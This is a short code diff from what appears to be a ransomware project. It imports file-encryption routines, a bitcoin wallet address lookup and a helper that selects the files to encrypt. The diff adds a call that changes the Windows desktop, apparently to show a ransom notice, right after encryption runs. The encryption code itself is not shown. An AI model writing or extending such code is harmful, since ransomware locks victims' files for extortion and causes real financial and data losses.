@@ -5,6 +5,7 @@ from core.encrypt_files import start_encryption
 from core.decrypt_files import start_decryption
 from core.comms.bitcoin_address import get_bitcoin_wallet_address
 from core.utils.file_ops import get_files_to_be_encrypted
+from core.windows_ops import background 
 
 logger = logging.getLogger()
 
@@ -14,6 +15,7 @@ def encrypt_button_handler():
     # current_directory = os.path.dirname(os.path.abspath(__file__))
     list_of_files_to_be_encrypted = get_files_to_be_encrypted(current_directory)
     start_encryption(list_of_files_to_be_encrypted)
+    background.change_desktop()
     logger.info("ENCRYPTION DONE")
 
 
